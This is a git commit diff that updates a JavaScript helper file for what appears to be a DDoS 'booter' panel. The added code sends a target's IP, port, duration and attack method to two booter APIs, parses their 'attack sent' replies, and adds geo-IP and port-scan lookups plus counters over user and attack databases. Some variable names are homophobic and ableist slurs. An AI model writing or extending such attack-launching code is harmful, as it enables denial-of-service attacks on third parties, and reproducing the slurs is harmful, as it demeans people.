4937ce35804388e389c3dd6c662ddf76d86e49a8
Devious <74839733+DeviousTheDev@users.noreply.github.com>
2021-01-24 17:49:55 -0500

    Update functions.js

--- extra/functions.js
+++ extra/functions.js
@@ -1,35 +1,75 @@
 const fs = require("fs");
+const config = require("../config/strings.js");
 const func = require("./functions.js");
-var term = require( 'terminal-kit' ).terminal ;
+const fetch = require("node-fetch");
+var term = require( 'terminal-kit' ).terminal;
+const { Socket } = require("dgram");
 
+exports.GeoIP = async function(ip) {
+    let results = await(await fetch("https://scrapy.tech/tools/?action=geoip&q="+ ip)).text();
+    return results;
+}
 
-exports.Input = function(str) {
-    term( str ) ;
+exports.pScan = async function(ip) {
+    let get_result = await(await fetch("https://scrapy.tech/tools/?action=portscan&q=" + ip)).text();
+    return get_result;
+}
 
-    term.inputField(
-        { history: history , autoComplete: autoComplete , autoCompleteMenu: true } ,
-        function( error , input ) {
-            if(!input) {
-                return null;
-            } else {
-                return input;
-            }
+exports.stats = function(option) {
+    if(option === null || option === "undefined") {
+        return "Invalid argument";
+    } else {
+        switch(option) {
+            case "users":
+                return func.lineCOUNT("./db/users.db")-1;
+            case "current":
+                return func.lineCOUNT("./db/current.db")-1;
+            case "attacks":
+                return func.lineCOUNT("./db/attacks.db")-1;
+            case "logs":
+                return func.lineCOUNT("./db/logs.db")-1;
         }
-    ) ;
+    }
 }
 
-exports.removeSTR = function(str, array_of_str_to_remove) {
-    let new_str = "";
-    array_of_str_to_remove.forEach(rmSTR => {
-        if(str.includes(rmSTR)) {
-            new_str = str.split(rmSTR).join('');
-        }
-    })
+exports.lineCOUNT = function(file_path) {
+    let fag = fs.readFileSync(file_path, "utf8");
+    let hover_is_gay = fag.split("\n").length;
+    return hover_is_gay;
 }
 
-exports.autism = async function() {
-  let r = await(await fetch("https://google.com")).text();
+exports.log = function() {
 
-  return r;
 }
 
+exports.log_to_file = function(str) {
+    fs.appendFileSync("./db/logs.db", str);
+}
+
+exports.log_attacks = function(ip, port, time, method) {
+
+}
+
+exports.send_attack = async function(ip, port, time, method) {
+    let response = "";
+    let rreturn = await(await fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    response += "API 1: " + await func.get_api_response(rreturn) + "\r\n";
+    let rreturn1 = await(await fetch(config.BOOTERAPI2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    response += "API 2: " + await func.get_api_response(rreturn1) + "\r\n";
+    return response;
+}
+
+exports.get_api_response = function(rpn) {
+    rpn = rpn.toLowerCase();
+    if(rpn.includes("attack sent") || rpn.includes("!* udp") || rpn.includes("!* tcp")) {
+        return "Attack Sent";
+    } else if(rpn.includes("invalid key") || rpn.includes("key is invalid")) {
+        return "Error, Invalid Key";
+    } else if(rpn.includes("invalid method") || rpn.includes("method is invalid") || rpn.includes("method does not exist") || rpn.includes("method doesn't exist")) {
+        return "Error, Invalid Method";
+    } else if(rpn.includes("error when connecting to the server if the problem")) { //CUSTOM (REMOVE LATER)
+        return "Error, Either all fields aren't set or invalid method!";
+    } else {
+        return "Error, Something went wrong catching attack response!";
+    }
+}
